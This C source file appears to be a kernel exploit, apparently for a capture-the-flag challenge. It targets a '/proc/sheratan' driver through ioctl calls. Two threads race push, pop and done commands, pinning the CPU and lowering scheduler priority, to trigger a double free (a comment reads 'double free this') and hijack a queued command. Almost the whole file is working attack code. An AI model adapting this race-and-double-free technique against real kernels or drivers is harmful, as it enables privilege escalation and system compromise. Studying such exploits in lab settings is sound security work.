```c
#include <sched.h>
#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <unistd.h>

#include "libs/pwn.h"

/*******************************
 * EXPLOIT                     *
 *******************************/

#define PROC_NAME "/proc/sheratan"

int init_sheratan() { return SYSCHK(open(PROC_NAME, O_RDWR)); }

void sheratan_push(int sheratan_fd, enum sheratan_cmds cmd) {
  struct sheratan_param param = {.cmd = cmd};
  SYSCHK(ioctl(sheratan_fd, SHERATAN_IOCTL_PUSH, &param));
}

enum sheratan_cmds sheratan_pop(int sheratan_fd) {
  struct sheratan_param param;
  int ret = ioctl(sheratan_fd, SHERATAN_IOCTL_POP, &param);
  if (ret < 0)
    return -1;
  return param.cmd;
}

void sheratan_done(int sheratan_fd) {
  struct sheratan_param param;
  SYSCHK(ioctl(sheratan_fd, SHERATAN_IOCTL_DONE, &param));
}

void sheratan_get_stats(int sheratan_fd, struct sheratan_status *status) {
  struct sheratan_param param = {.status = status};
  SYSCHK(ioctl(sheratan_fd, SHERATAN_IOCTL_GET_STATUS, &param));
}

void sheratan_set_stats(int sheratan_fd, struct sheratan_status *status) {
  struct sheratan_param param = {.status = status};
  SYSCHK(ioctl(sheratan_fd, SHERATAN_IOCTL_SET_STATUS, &param));
}

int start;

void *victim(void *arg) {
  int sfd = *(int *)arg;

  linfo("pushing ping cmd");
  sheratan_push(sfd, PING);
  linfo("ping done, start race");
  sheratan_done(sfd);
  // double free this
  sheratan_push(sfd, BOOST_ENABLE);
  linfo("reboot done");

  return NULL;
}

void *hijack(void *arg) {
  int sfd = *(int *)arg;
  event_wait(start);
  sheratan_push(sfd, BOOST_DISABLE);
  linfo("boost done");

  return NULL;
}

int main(int argc, char *argv[]) {
  int sfd;
  pthread_t victim_thread, hijack_thread;
  enum sheratan_cmds cmd = -1, cmd2 = -1;

  lstage("INIT");

  rlimit_increase(RLIMIT_NOFILE);
  pin_cpu(0, 0);
  start = event_create();
  sfd = init_sheratan();
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  lstage("START");

  pthread_create(&victim_thread, NULL, victim, &sfd);
  pthread_create(&hijack_thread, NULL, hijack, &sfd);
  set_scheduler(0, SCHED_IDLE, 0);

  linfo("poping cmd");
  while (cmd == -1) {
    sched_yield();
    cmd = sheratan_pop(sfd);
  }
  linfo("popped cmd %d", cmd);
  sheratan_done(sfd);
  linfo("finished cmd");

  event_signal(start);
  usleep(100);

  cmd = sheratan_pop(sfd);
  linfo("popped cmd %d", cmd);
  sheratan_done(sfd);

  cmd2 = sheratan_pop(sfd);
  linfo("popped cmd %d", cmd);

  if (cmd != cmd2)
    lerror("failed to hijack");
  linfo("hijack success");

  pthread_join(victim_thread, NULL);
  pthread_join(hijack_thread, NULL);

  lstage("END");

  return 0;
}
```
